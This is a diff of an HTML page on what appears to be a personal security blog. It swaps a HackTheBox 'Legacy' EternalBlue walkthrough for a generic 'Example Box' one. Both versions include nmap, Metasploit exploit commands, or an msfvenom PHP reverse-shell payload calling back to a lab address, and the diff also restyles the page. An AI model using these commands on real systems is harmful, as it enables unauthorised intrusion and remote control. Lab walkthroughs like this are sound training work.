@@ -3,104 +3,145 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>HTB: Legacy | Timeless</title>
+  <title>Walkthrough: Example Box | Timeless</title>
   <style>
     :root {
       --bg: #0d0d0d;
       --fg: #e0e0e0;
       --accent: #9c6eff;
       --accent-glow: #9c6eff55;
-      --terminal-bg: #111;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
 
     body {
       background-color: var(--bg);
       color: var(--fg);
       font-family: 'Courier New', Courier, monospace;
-      padding: 2rem;
-      line-height: 1.6;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
     }
 
-    a {
+    header {
+      padding: 1rem 2rem;
+      border-bottom: 1px solid var(--accent);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background-color: #111;
+      box-shadow: 0 2px 10px var(--accent-glow);
+    }
+
+    nav a {
       color: var(--accent);
       text-decoration: none;
+      margin-left: 1.5rem;
+      transition: 0.2s;
+    }
+
+    nav a:hover {
+      color: var(--fg);
+    }
+
+    .container {
+      padding: 2rem;
+      max-width: 900px;
+      margin: auto;
     }
 
     h1 {
+      font-size: 2.2rem;
       color: var(--accent);
-      font-size: 2.25rem;
-      margin-bottom: 0.5rem;
+      margin-bottom: 1rem;
+      text-shadow: 0 0 10px var(--accent-glow);
     }
 
     h2 {
-      color: var(--accent);
       margin-top: 2rem;
+      color: var(--accent);
     }
 
-    .tags {
-      font-size: 0.85rem;
-      color: #aaa;
-      margin-bottom: 2rem;
-    }
-
-    .terminal {
-      background-color: var(--terminal-bg);
-      border: 1px solid var(--accent);
-      border-radius: 8px;
-      padding: 1rem;
+    p {
       margin: 1rem 0;
-      color: #d0d0d0;
+      line-height: 1.6;
+    }
+
+    pre {
+      background-color: #111;
+      padding: 1rem;
+      border-left: 4px solid var(--accent);
       overflow-x: auto;
-      white-space: pre-wrap;
+      margin: 1rem 0;
+      box-shadow: 0 0 10px var(--accent-glow);
+    }
+
+    code {
+      color: var(--accent);
     }
 
     img {
       max-width: 100%;
-      border: 1px solid #333;
-      border-radius: 6px;
       margin: 1rem 0;
+      border: 1px solid #333;
+      box-shadow: 0 0 10px var(--accent-glow);
+      border-radius: 6px;
     }
 
-    .back-link {
-      margin-top: 2rem;
-      display: block;
+    footer {
+      margin-top: auto;
+      padding: 1rem;
+      text-align: center;
       font-size: 0.9rem;
+      color: #666;
+      border-top: 1px solid #222;
     }
   </style>
 </head>
 <body>
+  <header>
+    <div><strong style="color: white;">Timeless</strong></div>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="blog.html">Blog</a>
+      <a href="walkthroughs.html">Walkthroughs</a>
+      <a href="whoami.html">whoami</a>
+    </nav>
+  </header>
 
-  <h1>HTB: Legacy</h1>
-  <div class="tags">Platform: Windows &nbsp;|&nbsp; Difficulty: Easy &nbsp;|&nbsp; Technique: EternalBlue</div>
+  <div class="container">
+    <h1>Walkthrough: Example Box</h1>
 
-  <p>This was one of my first HackTheBox machines and a great intro to legacy Windows exploitation. It uses SMB and EternalBlue (MS17-010).</p>
+    <p><strong>Difficulty:</strong> Easy<br>
+       <strong>Platform:</strong> HackTheBox</p>
 
-  <h2>1. Nmap Scan</h2>
-  <div class="terminal">
-nmap -sC -sV -oA legacy 10.10.10.4
+    <h2>Reconnaissance</h2>
+    <p>Started with an Nmap scan to identify open ports and services.</p>
+
+    <pre><code>nmap -sC -sV -oN initial.txt 10.10.10.10</code></pre>
+
+    <h2>Enumeration</h2>
+    <p>Found a vulnerable login panel at <code>/admin</code>. Used default credentials to log in.</p>
+    <img src="images/admin-login.png" alt="Admin login panel screenshot">
+
+    <h2>Exploitation</h2>
+    <p>Uploaded a reverse shell using the file upload feature:</p>
+    
+    <pre><code>msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw > shell.php</code></pre>
+
+    <h2>Privilege Escalation</h2>
+    <p>Discovered the box was running an outdated kernel vulnerable to local privilege escalation.</p>
+
+    <h2>Root Flag</h2>
+    <pre><code>cat /root/root.txt</code></pre>
   </div>
-  <p>The scan shows ports 139 and 445 open, with an SMB service running on an unpatched Windows XP box.</p>
 
-  <h2>2. Exploitation</h2>
-  <p>I used the following Metasploit module to gain access:</p>
-  <div class="terminal">
-msfconsole  
-use exploit/windows/smb/ms17_010_eternalblue  
-set RHOST 10.10.10.4  
-run
-  </div>
-
-  <h2>3. Post Exploitation</h2>
-  <p>After gaining a shell, I used basic enumeration to find user and root flags:</p>
-  <div class="terminal">
-whoami  
-dir C:\Users  
-type user.txt  
-type root.txt
-  </div>
-
-  <img src="../images/legacy-pwned.png" alt="Proof of pwnage screenshot" />
-
-  <p class="back-link"><a href="../walkthroughs.html">&larr; Back to Walkthroughs</a></p>
+  <footer>
+    &copy; 2025 Timeless. All rights reserved.
+  </footer>
 </body>
 </html>
